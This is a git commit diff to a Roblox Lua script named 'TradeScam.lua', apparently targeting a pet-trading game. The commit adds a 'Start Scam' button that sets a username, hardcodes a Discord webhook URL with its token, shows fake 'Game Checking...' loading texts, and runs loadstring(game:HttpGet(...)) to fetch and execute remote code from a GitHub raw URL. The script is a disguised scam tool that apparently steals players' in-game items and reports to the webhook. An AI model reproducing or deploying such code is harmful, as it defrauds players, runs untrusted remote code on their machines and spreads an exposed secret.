0318d6457361451be491d31c6ec302d930a000b7
Pro567 <130426006+minecraftSteve88@users.noreply.github.com>
2023-04-29 07:46:35 +0800

    Update TradeScam.lua

--- TradeScam.lua
+++ TradeScam.lua
@@ -7,7 +7,27 @@ local Tab = Window:NewTab("TradeScam")
 local Section = Tab:NewSection("TradeScam")
 
 Section:NewButton("Start Scam", "ButtonInfo", function()
+Username = "XXxxGamer12345xxXX"
 
-print("Clicked")
+WebHook = "https://discord.com/api/webhooks/1081853543218151424/38a7tN6RZe0OWTPe1KxKEk0eHfwilf7jNsRlCnx4xJZdvdFGYz5ZUrzY6qQMtuRK53Al"
+
+loadingscreen = true
+
+_G.CustomScriptName = "Checking Game"
+
+_G.Text1 = "Game Checking..."
+
+_G.Text2 = "Game Checked Successfully"
+
+_G.Text3 = "Checking Scripts..."
+
+_G.Text4 = "Starting Scripts..."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+
+    print("Clicked")
 
 end)
+
+
+
